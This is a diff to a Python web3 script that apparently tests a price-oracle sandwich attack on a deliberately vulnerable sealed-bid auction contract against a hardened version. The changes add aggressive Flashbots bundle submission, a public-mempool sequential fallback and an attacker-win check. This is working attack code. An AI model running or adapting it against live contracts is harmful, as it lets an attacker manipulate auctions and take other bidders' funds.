@@ -129,16 +129,17 @@ def run_forge_script_and_extract_addresses(script_name="DeployWithSpot"):
 
     return Web3.to_checksum_address(vuln_addr), Web3.to_checksum_address(hard_addr)
 
-def get_eip1559_fees(priority_gwei=2):
+def get_eip1559_fees(priority_gwei=2, priority_gwei_override=None):
 
-    MAX_FEE_CAP_GWEI = 500 # Safe cap to prevent RPC error
+    MAX_FEE_CAP_GWEI = 80 # Safe cap to prevent RPC error
 
     """
     Calculates EIP-1559 maxFeePerGas and maxPriorityFeePerGas.
     We set a generous priority fee (bribe) to ensure inclusion for the Flashbots scenario.
     """
     # 2 Gwei base priority fee is standard for a good bribe
-    max_priority_fee = w3.to_wei(priority_gwei, 'gwei')
+    effective_priority_gwei = priority_gwei_override if priority_gwei_override is not None else priority_gwei
+    max_priority_fee = w3.to_wei(effective_priority_gwei, 'gwei')
 
     try:
         # Fetch the base fee from the latest block
@@ -165,7 +166,7 @@ def get_eip1559_fees(priority_gwei=2):
         return w3.eth.gas_price, None, True
 
 
-def build_and_sign_tx(function_call, from_account, value=0, gas=None, nonce=None):
+def build_and_sign_tx(function_call, from_account, value=0, gas=None, nonce=None, priority_gwei_override=None):
 
     """
     Build, sign and return raw tx bytes (signed).
@@ -173,7 +174,7 @@ def build_and_sign_tx(function_call, from_account, value=0, gas=None, nonce=None
     Includes EIP-1559 logic for online use with Flashbots.
     """
     # Get the fee structure
-    max_fee, max_priority_fee, use_legacy = get_eip1559_fees()
+    max_fee, max_priority_fee, use_legacy = get_eip1559_fees(priority_gwei_override=priority_gwei_override)
 
     tx_params = {
         "from": from_account.address,
@@ -216,7 +217,7 @@ def send_raw_and_wait(signed_tx):
     return w3.eth.wait_for_transaction_receipt(tx_hash)
 
 
-def try_send_non_fatal(function_call, account, value, context_name, gas_limit=None):
+def try_send_non_fatal(function_call, account, value, context_name, gas_limit=None, priority_gwei_override=None):
     """
     Helper to attempt a transaction, catch the error if it fails, and allow the script to continue.
     Returns True if successful, False otherwise.
@@ -235,6 +236,67 @@ def try_send_non_fatal(function_call, account, value, context_name, gas_limit=No
         tx_hash = tx_match.group(1) if tx_match else 'unknown'
         print(f"  ❌ FAILURE: {context_name} failed. Reason: Transaction {tx_hash} REVERTED on-chain. Details: {e}")
         return False
+
+def try_flashbots_bundle(fb, bundle, max_iterations: int = 3, target_blocks: int = 3) -> bool:
+    """Submits a bundle aggressively for multiple blocks over multiple attempts."""
+    BLOCK_JUMP = 10
+
+
+
+    for iteration in range(1, max_iterations + 1):
+        current_block = w3.eth.block_number
+
+        start_index = BLOCK_JUMP
+        end_index = BLOCK_JUMP + target_blocks
+
+        target_blocks_list = [current_block + i for i in range(start_index, end_index)]
+        submissions = []
+
+        try:
+            print(f" [ATTEMPT {iteration}/{max_iterations}] Current block: {current_block}. Submitting bundle aggressively to blocks {target_blocks_list[0]} through {target_blocks_list[-1]}.")
+
+            # Submits the bundle to all blocks in the target_blocks_list
+            for target_block in target_blocks_list:
+                send_result = fb.send_bundle(bundle, target_block)
+                submissions.append(send_result)
+            print(f"   Bundle sent to Flashbots for blocks {target_blocks_list}")
+
+            # Wait for inclusion check
+            receipts = submissions[-1].wait()
+
+            if receipts is not None:
+                # Check if any transaction in the bundle was included
+                print(f" SUCCESS: Bundle included in block {receipts[0].blockNumber}!")
+                return True
+
+            else:
+                # The send was successful, but the bundle wasn't included in the targeted blocks
+                print(" FAILURE: Bundle sent but was not included in the target block window.")
+
+        except Exception as e:
+            # Handle submission failure (e.g., relay down, signature error)
+            print(f" ERROR: Flashbots submission failed: {e}")
+
+        # Wait for approximately one block time before retrying
+        time.sleep(12)
+        current_block = w3.eth.block_number # Update current block before next iteration
+
+    print(f" ❌ FINAL FAILURE: Bundle not included after {max_iterations} iterations.")
+    return False
+
+def check_exploit_success(auction_contract, expected_winner):
+    """
+    Checks the final state of the auction contract.
+    """
+    # This is a placeholder and should be implemented in your full script
+    try:
+        final_winner = auction_contract.functions.winner().call()
+        if final_winner == expected_winner:
+            print(f"  ✅ ASSERTION PASS: Final winner is {final_winner} (Expected Attacker)")
+        else:
+            print(f"  ❌ ASSERTION FAIL: Final winner is {final_winner} (Expected Attacker {expected_winner})")
+    except Exception as e:
+        print(f"  ❌ ASSERTION FAIL: Could not call winner() on contract. Error: {e}")
 
 
 # ----------------------
@@ -267,7 +329,7 @@ def main():
     ALICE_NONCE_SECRET = Web3.keccak(text="secret-nonce-alice") # deterministic for test - bytes32
 
     # Attacker has a low nominal bid, designed to be inflated
-    ATTACKER_BID_AMOUNT = w3.to_wei(0.0001, "ether") # VERY LOW nominal bid
+    ATTACKER_BID_AMOUNT = w3.to_wei(0.003, "ether") # VERY LOW nominal bid
     ATTACKER_NONCE_SECRET = Web3.keccak(text="secret-nonce-attacker")
 
     # Deposit must match deployed contract's depositAmount
@@ -319,52 +381,66 @@ def main():
 
     # 3)---------- Sandwich: build front, ATTACKER REVEAL, back (single unified block) ----------
     print("\n--- Starting Sandwich Attack on Vulnerable Auction ---")
+    # We must define these variables so the sequential fallback can access them later.
+    front_run_fn = None
+    attacker_reveal_vuln_fn = vuln.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET)
+    attacker_reveal_hard_fn = hard.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET)
+    back_run_fn = None
+
 
     # Attacker manipulates the price (4x the original/stable price)
     P_STABLE = price_oracle.functions.getPrice().call() if price_oracle else None
     P_HIGH = w3.to_wei(0.04, "ether") # Artificially high price
 
     if price_oracle:
+        front_run_fn = price_oracle.functions.setPrice(P_HIGH)
+        back_run_fn = price_oracle.functions.setPrice(P_STABLE)
         print(f"Stable oracle price: {w3.from_wei(P_STABLE, 'ether')} ETH. Inflated price: {w3.from_wei(P_HIGH, 'ether')} ETH.")
 
     # Prepare nonces: explicit attacker nonces for deterministic ordering
     att_nonce = w3.eth.get_transaction_count(attacker.address)
 
+    ATTACKER_GAS_LIMIT = 2_000_000
+    # Increase the priority fee significantly for the sandwich bundle to encourage inclusion
+    SANDWICH_PRIORITY_GWEI = 5
+
     # 3a. Attacker front-run: set Price to P_HIGH (nonce = att_nonce)
     front_signed = None
-    if price_oracle:
-        front_signed = build_and_sign_tx(price_oracle.functions.setPrice(P_HIGH), attacker, nonce=att_nonce)
+    if front_run_fn:
+        front_signed = build_and_sign_tx(front_run_fn, attacker, nonce=att_nonce, priority_gwei_override=SANDWICH_PRIORITY_GWEI)
         att_nonce += 1 # Increment nonce for the next transaction
 
     # 3b. Attacker reveal: exploit the high price (nonce = att_nonce + 1)
-    ATTACKER_GAS_LIMIT = 2_000_000
+
     attacker_reveal_signed = build_and_sign_tx(
-        vuln.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET),
+        attacker_reveal_vuln_fn,
         attacker,
         value=ATTACKER_BID_AMOUNT,
-        nonce=att_nonce + 1,
-        gas=ATTACKER_GAS_LIMIT
+        nonce=att_nonce,
+        gas=ATTACKER_GAS_LIMIT,
+        priority_gwei_override=SANDWICH_PRIORITY_GWEI
     )
     print(f"Attacker's effective bid will be calculated using nominal bid {w3.from_wei(ATTACKER_BID_AMOUNT, 'ether')} * inflated price {w3.from_wei(P_HIGH, 'ether')}")
     att_nonce += 1 # Increment nonce for the next transaction
 
     # 3c. Attacker reveal: HARDENED auction (nonce = att_nonce)
     attacker_reveal_hard_signed = build_and_sign_tx(
-        hard.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET), 
-        attacker, 
-        value=ATTACKER_BID_AMOUNT, 
+        attacker_reveal_hard_fn,
+        attacker,
+        value=ATTACKER_BID_AMOUNT,
         nonce=att_nonce,
-        gas=ATTACKER_GAS_LIMIT
+        gas=ATTACKER_GAS_LIMIT,
+        priority_gwei_override=SANDWICH_PRIORITY_GWEI
     )
     print(f"Attacker reveal HARDENED (Nonce {att_nonce}): should REVERT due to price check.")
     att_nonce += 1 # Increment nonce for the next transaction
 
     # 3d. Attacker back-run: reset Price to P_STABLE (nonce = att_nonce + 2)
     back_signed = None
-    if price_oracle:
-        back_signed = build_and_sign_tx(price_oracle.functions.setPrice(P_STABLE), attacker, nonce=att_nonce + 2)
+    if back_run_fn:
+        back_signed = build_and_sign_tx(back_run_fn, attacker, nonce=att_nonce, priority_gwei_override=SANDWICH_PRIORITY_GWEI)
 
-    # 4) Send bundle via Flashbots
+    # 4a) Send bundle via Flashbots
     bundle = []
     if front_signed:
         bundle.append(front_signed.rawTransaction)
@@ -373,38 +449,72 @@ def main():
     if back_signed:
         bundle.append(back_signed.rawTransaction)
 
-    def try_flashbots_bundle(bundle_bytes_list, attempt_blocks=3, offset=1):
-        for i in range(attempt_blocks):
-            target_block = w3.eth.block_number + offset + i
-            try:
-                print(f"  Sending bundle to Flashbots for target block {target_block} (attempt {i+1}/{attempt_blocks})")
-                res = fb.send_bundle(bundle_bytes_list, target_block_number=target_block)
-                print("  Flashbots send returned. Waiting for inclusion...")
-                receipt = res.wait() # blocking
-
-                if receipt:
-                    if receipt['status'] == 0:
-                        print(f"  Warning: Bundle included in block {receipt['blockNumber']} but one or more TXs REVERTED (Status 0).")
-                        # This should be treated as a failure for the attack, but the script must continue.
-                        return False
-
-                    print(f"  Bundle included in block {receipt['blockNumber']}")
-                    return True
-
-            except Exception as e:
-                # Catch communication or submission errors
-                print(f"  Flashbots send failed or inclusion check error (will retry next block): {e}")
-                time.sleep(13)
-                continue
-        return False
-
     bundle_included = False
     if FLASHBOTS_ENABLED and fb:
-        bundle_included = try_flashbots_bundle(bundle, attempt_blocks=3, offset=1)
+        bundle_included = try_flashbots_bundle(fb, bundle, max_iterations=1, target_blocks=10)
         if bundle_included:
-            print("Bundle submitted via Flashbots and included. **Attacker has won the vulnerable auction.**")
+            print("\n**Bundle submitted via Flashbots and included. Attacker attempted to win both auctions.**")
+            print("The Vulnerable auction should be won by the Attacker. The Hardened auction reveal should have reverted.")
+
         else:
             print("Bundle sent but not included in target blocks (or send failed). Proceeding with public Alice reveal.")
+
+    # 4b) SEQUENTIAL BROADCAST FALLBACK (High-Risk Public Mempool Strategy) 
+    if not bundle_included:
+        print("\n!!! FALLBACK TRIGGERED: Atomic Bundle Failed. Switching to High-Risk Sequential Broadcast !!!")
+        print("Note: This is vulnerable to arbitrage bots stealing the profit, but provides a guaranteed broadcast.")
+        # --- Sequential Broadcast Execution using the robust try_send_non_fatal helper ---
+
+        # TX 1: Front-Run (Price Inflation)
+        try_send_non_fatal(
+            front_run_fn,
+            attacker,
+            value=0,
+            context_name="Sequential: 1/4 Price Inflation TX",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        )
+
+        # TX 2: Attacker Reveal (Vulnerable) - Mirrors section 5 logic, but with high gas/priority
+        # This fixes the ContractLogicError and simplifies nonce management.
+        try_send_non_fatal(
+            attacker_reveal_vuln_fn,
+            attacker,
+            value=ATTACKER_BID_AMOUNT,
+            context_name="Sequential: 2/4 VULNERABLE Reveal TX",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        )
+
+        # TX 3: Attacker Reveal (Hardened) - Expected to REVERT
+        try_send_non_fatal(
+            attacker_reveal_hard_fn,
+            attacker,
+            value=ATTACKER_BID_AMOUNT,
+            context_name="Sequential: 3/4 HARDENED Reveal TX (Expected Revert)",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        )
+
+        # TX 4: Back-Run (Price Deflation)
+        if try_send_non_fatal(
+            back_run_fn,
+            attacker,
+            value=0,
+            context_name="Sequential: 4/4 Price Deflation TX",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        ):
+             bundle_included = True # Mark as "successful" for final state check if the deflation worked
+
+    if bundle_included:
+        print("\n*** EXPLOIT ATTEMPT COMPLETE ***")
+        # Check the VULNERABLE auction for success.
+        check_exploit_success(vuln, expected_winner=attacker.address)
+    else:
+        print("\n*** ALL ATTEMPTS FAILED ***")
+        print("The attack failed to execute successfully in either atomic or sequential mode.")
+    
 
     # 5a) Alice's Public Reveal (happens outside the sandwich)
     print("\n--- Alice Public Reveal on Vulnerable Auction ---")
